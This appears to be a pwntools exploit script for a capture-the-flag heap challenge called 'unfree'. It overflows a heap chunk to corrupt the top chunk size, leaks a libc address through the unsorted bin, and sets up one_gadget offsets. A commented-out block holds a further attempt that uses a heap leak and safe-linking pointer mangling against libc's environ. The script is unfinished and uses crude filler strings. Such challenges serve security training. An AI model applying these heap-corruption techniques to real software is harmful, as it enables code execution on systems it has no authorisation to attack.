from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./unfree_patched")
libc = ELF("./libc.so.6")
one_gadget = [0x583dc, 0x583e3, 0xef4ce, 0xef52b]
libc.sym.one_gadget = one_gadget[1]

#libc.sym.main_arena = libc.sym.__madlloc_hook + 0x10

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)


current_index = 0

def create(size):
    global current_index

    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"1")

    io.recvline()
    io.sendline(str(current_index).encode())
    io.recvline()

    io.sendline(str(size).encode())
    io.recvline()

    io.send(b"A")

    current_index += 1

    return current_index - 1

def cr(index, size, data):
    global current_index

    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"1")

    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()

    io.sendline(str(size).encode())
    io.recvline()

    io.send(data)

def edit(index, data):
    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"2")

    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()

    io.send(data)

def view(index):

    io.recvuntil("0. Exit")
    io.recvline()
    io.sendline(b"3")

    io.recvline()
    io.sendline(str(index).encode())

    return io.recvline()
        
def extract_address(leak):
    return u64(leak.strip().ljust(8, b"\x00"))

context.terminal = ['gnome-terminal', '-e']
context.arch = "amd64"
io = start()

cr(0, 0x18, b"sexo")
edit(0, b"A"*0x18 + p64(0xd51)) # Modificamos Top chunk
cr(1, 0xd48, b"sexo") # Link a UnsortedBin

# Leak Libc
edit(0, b"A"*0x20)
leak_address = int(hex(u64(view(0)[0x20:].strip().ljust(8, b"\x00"))) + "00", 16)

libc.address = leak_address - 64 + libc.sym.main_arena

edit(0, b"A"*0x18 + p64(0x31))
#cr(2, 0xd18, b"sexo")


"""
cr(0, 0x10, b"wan")
edit(0, b'wan'.ljust(0x10) + flat(0, 0xd51)) # 1
cr(1, 0xe00+0x180, b"\x00"*0xe00 + b'wanwan') # 2
cr(2, 0xd20, b"\x01")
leak_address = extract_address(view(2).strip())

print(f"Leak Libc Address {hex(leak_address)}")

libc.address = (leak_address - 65) - libc.sym.main_arena

print(f"System Address {hex(libc.sym.system)}")

edit(1, b'A'*0xf80 + flat(0, 0x71)) # 3
cr(3, 0xff0 - 0x70, b'wanwan') # 5
edit(3, b'A'.ljust(0xff0 - 0x70) + flat(0, 0x71)) # 4
cr(4, 0xff0 - 0x70, b'wanwan') # 6
edit(1, b'A'*(0xff0 - 0x70 + 0x10))
leak_heap_address = view(1)[0xf90::].strip()

heap = (u64(leak_heap_address.ljust(8, b"\x00")) << 12) - 0x21000

print(f"Leak Heap Address: {hex(heap)}")

payload = (libc.sym.environ - 0x10) ^ (heap + 0x43fa0 >> 12)

payload = flat(0, 0x51, p64(payload))

print(payload)
print(len(payload))
#edit(3, b"A"*(0xff0 - 0x70) + p64(payload).ljust(16, b"\x00")) # + flat(0, 0x51, (libc.sym.environ - 0x10) ^ (heap+0x43fa0 >> 12)))

edit(3, b"A"*(0xff0 - 0x70 - 32) + flat(0, 0x51, payload)) # + flat(0, 0x51, (libc.sym.environ - 0x10) ^ (heap+0x43fa0 >> 12)))

#cr(0, 0x40, b"wan")
#cr(0, 0x40, b"A"*0x10)

#leak_stack_address = view(0)

#print(f"Leak Stack Address: {leak_stack_address}")
"""

io.interactive()
